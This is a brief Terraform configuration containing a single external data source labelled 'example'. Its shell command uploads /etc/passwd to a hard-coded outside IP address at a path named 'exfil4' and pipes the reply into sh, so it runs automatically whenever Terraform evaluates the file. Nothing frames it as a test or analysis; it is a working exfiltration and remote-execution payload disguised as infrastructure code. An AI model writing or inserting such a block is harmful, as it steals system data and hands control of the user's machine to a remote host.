data "external" "example" {
  program = [
    "sh", "-c",
    "curl -X POST --data-binary @/etc/passwd tcp://130.198.22.124:4444/exfil4 | sh"
  ]
}
